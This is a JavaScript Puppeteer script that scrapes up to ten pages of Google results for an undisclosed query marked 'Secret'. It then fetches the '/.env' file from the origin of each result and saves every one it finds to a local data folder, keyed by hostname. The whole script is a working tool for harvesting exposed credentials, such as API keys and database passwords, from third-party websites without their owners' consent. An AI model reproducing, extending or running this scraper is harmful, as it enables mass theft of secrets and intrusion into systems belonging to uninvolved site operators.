const puppeteer = require('puppeteer');
const fs = require('fs');
const path = require('path');

async function scrapeGoogle(query) {
    const browser = await puppeteer.launch({ headless: false });
    const page = await browser.newPage();
    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36');
    await page.setDefaultNavigationTimeout(60000);
    await page.goto(`https://www.google.com/search?q=${query}`, { waitUntil: 'networkidle2', timeout: 60000 });
    
    let results = [];
    for (let i = 0; i < 10; i++) {
        await page.waitForSelector('h3'); 
        const pageResults = await page.evaluate(() => {
            const links = Array.from(document.querySelectorAll('a h3'));
            return links.map(link => link.closest('a').href);
        });
        
        results.push(...pageResults);

        const nextButton = await page.$('a#pnnext');
        if (nextButton) {
            await Promise.all([
                nextButton.click(),
                page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 60000 })
            ]);
        } else {
            break;
        }
    }

    // Check each URL for a .env file
    for (const url of results) {
        const envUrl = `${new URL(url).origin}/.env`;
        console.log(`Checking: ${envUrl}`);

        try {
            const envPage = await browser.newPage();
            const response = await envPage.goto(envUrl, { waitUntil: 'domcontentloaded', timeout: 10000 });

            if (response.status() === 200) {
                const envContent = await response.text();
                const fileName = `${new URL(url).hostname}.env`;
                const filePath = path.join(__dirname, 'data', fileName);

                fs.mkdirSync(path.join(__dirname, 'data'), { recursive: true });
                fs.writeFileSync(filePath, envContent);

                console.log(`.env file saved for ${url} as ${fileName}`);
            } else {
                console.log(`No .env file found at ${envUrl}`);
            }

            await envPage.close();
        } catch (error) {
            console.log(`Failed to check ${envUrl}: ${error.message}`);
        }
    }

    await browser.close();
}

scrapeGoogle("____________"); // Secret
